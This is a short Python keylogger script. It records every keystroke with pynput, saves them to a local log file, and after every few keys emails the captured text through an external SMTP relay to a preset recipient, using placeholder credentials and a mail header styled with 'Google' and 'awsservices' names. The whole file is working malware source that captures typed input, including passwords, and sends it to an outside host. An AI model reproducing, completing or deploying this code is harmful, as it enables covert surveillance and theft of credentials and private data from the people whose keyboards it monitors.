import pynput
from pynput import keyboard
import smtplib
import logging


print("Started keylogging")
# Email credentials
username = "SMTP_Uname"
password = "SMT_PASS"
recipient = ["recipient@gmail.com"]

message = """From: From Person <Google>
To: To Person <awsservices>
Subject: Key Logger output

logged keys:
"""
keys = []
log_dir = ""

count = 0

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
print("Defined methods")

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    logging.info(str(message))
    send_log(message)

def send_log(msg):
    server = smtplib.SMTP('smtp-relay.sendinblue.com', 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(username, recipient, message+msg)
    server.quit()

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
print("sent logs to the defined recipient")


